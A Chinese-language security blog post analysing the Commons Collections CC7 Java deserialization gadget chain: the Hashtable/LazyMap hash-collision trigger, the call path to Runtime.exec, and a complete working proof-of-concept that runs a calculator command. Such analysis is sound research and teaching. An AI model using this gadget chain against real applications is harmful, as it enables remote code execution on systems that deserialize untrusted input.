---
title: CommonCollections-7
description: CC7 利用 Hashtable 在反序列化时触发 equals 比较，绕开了 CC1 对 AnnotationInvocationHandler 的依赖，对 JDK 无版本限制。
date: 2026-04-25
tag:
  - Java
  - Security
author: me7eorite
hidden: true
readingTime: true
---

# CommonCollections-7

> CC7 利用 `Hashtable#readObject` 作为入口，通过两个哈希值相同的 LazyMap 在 `reconstitutionPut` 中触发 `equals` 比较，进而调用 `LazyMap#get` 触发链。
> 绕开了 CC1 对 `AnnotationInvocationHandler` 的依赖，JDK 无版本限制。

# 调用路径
```
Hashtable#readObject
  → reconstitutionPut                  [将序列化的 entry 重新插入]
  → LazyMap1.equals(LazyMap2)          [两个 LazyMap 的 hash 相同时触发]
  → AbstractMap#equals                 [遍历 entrySet，逐项调用 get]
  → LazyMap2#get("yy")                 [key 被 remove 后不存在，触发 transform]
  → ChainedTransformer#transform
  → ConstantTransformer#transform
  → InvokerTransformer#transform × 3
  → Runtime#exec
```

三层分类:
- Source: `Hashtable#readObject` → `equals`
- Gadget: `LazyMap` → `ChainedTransformer`
- Sink:   `InvokerTransformer` → `Runtime.exec`

# 关键方法

## Hashtable
`Hashtable` 与 `HashMap` 的对比：

| 特性              | Hashtable       | HashMap         |
| --------------- | --------------- | --------------- |
| 父类              | Dictionary      | AbstractMap     |
| key/value 允许 null | 不允许            | 允许              |
| 线程安全            | 是               | 否               |
| 内部结构            | 数组 + 链表        | 数组 + 链表 + 红黑树  |


# 利用链分析

`reconstitutionPut` 的关键逻辑：
```java
int hash = key.hashCode();
int index = (hash & 0x7FFFFFFF) % tab.length;
for (Entry<?,?> e = tab[index]; e != null; e = e.next) {
    if ((e.hash == hash) && e.key.equals(key)) {   // hash 相同才调用 equals
        throw new StreamCorruptedException();
    }
}
```

因此触发 `equals` 的前提是：**两个 key 的 `hashCode()` 相同**。

## 哈希碰撞：为什么用 "yy" 和 "zZ"
Java `String#hashCode` 计算公式：`h = 31 * h + c`

- `"yy"`: `31 * 'y' + 'y'` = `31 * 121 + 121` = `3751 + 121` = **3872**
- `"zZ"`: `31 * 'z' + 'Z'` = `31 * 122 + 90` = `3782 + 90` = **3872**

两者哈希值相同，可以触发碰撞。LazyMap 继承自 AbstractMap，其 `hashCode` 由内部 entry 的哈希决定，因此在各自放入一个 key 后，两个 LazyMap 的 `hashCode()` 相同，`reconstitutionPut` 就会调用 `LazyMap1.equals(LazyMap2)`。

## 为什么需要 LazyMap2.remove("yy")
`Hashtable.put(LazyMap1, 1)` 执行时，内部调用 `LazyMap1.hashCode()`，此时 LazyMap1 含有 `"yy"` 键。
`Hashtable.put(LazyMap2, 1)` 执行时，`reconstitutionPut` 发现 LazyMap2 与 LazyMap1 哈希相同，调用 `LazyMap1.equals(LazyMap2)`，该调用会执行 `LazyMap2.get("yy")`。
由于此时 `chainedTransformer` 使用空数组，不会触发命令执行。但 `LazyMap#get` 在 key 不存在时会将 key 写入 Map（执行 transform 并 put 结果）。反序列化时若 `"yy"` 已存在于 LazyMap2 中，`get` 直接返回，不再触发 transform，链断裂。
因此必须在 `put(LazyMap2, 1)` 之后调用 `LazyMap2.remove("yy")`。


## 完整 POC
```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
        new Object[]{null, null}),
    new InvokerTransformer("exec", new Class[]{String.class},
        new Object[]{"open -a Calculator"})
};

// 先用空 Transformer 数组，避免构造阶段触发
ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});

HashMap hashMap1 = new HashMap();
HashMap hashMap2 = new HashMap();

Map LazyMap1 = LazyMap.decorate(hashMap1, chainedTransformer);
LazyMap1.put("yy", 1);             // "yy".hashCode() == 3872
Map LazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);
LazyMap2.put("zZ", 1);             // "zZ".hashCode() == 3872，触发哈希碰撞

Hashtable hashtable = new Hashtable();
hashtable.put(LazyMap1, 1);
hashtable.put(LazyMap2, 1);        // 此时 LazyMap2.get("yy") 被调用，"yy" 被写入 LazyMap2

LazyMap2.remove("yy");             // 清除提前插入的 key，确保反序列化时能再次触发

// 通过反射换入真实 Transformer 链
Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
iTransformers.setAccessible(true);
iTransformers.set(chainedTransformer, transformers);

// 序列化 & 反序列化
ByteArrayOutputStream baos = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(hashtable);
oos.close();

ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
ObjectInputStream ois = new ObjectInputStream(bais);
ois.readObject();
```

注意事项:
1. 两个 LazyMap 必须共用同一个 `ChainedTransformer` 实例，这样反射替换一次就能让两条路径都生效。
2. `hashtable.put(LazyMap2, 1)` 执行完毕后必须立即 `LazyMap2.remove("yy")`，这是最容易遗漏的步骤。
3. 反射替换 `iTransformers` 须在序列化之前，序列化之后 Transformer 已被写入字节流，替换无效。
4. `Hashtable` 不允许 null key，构造时传入的 LazyMap 需保证非 null。
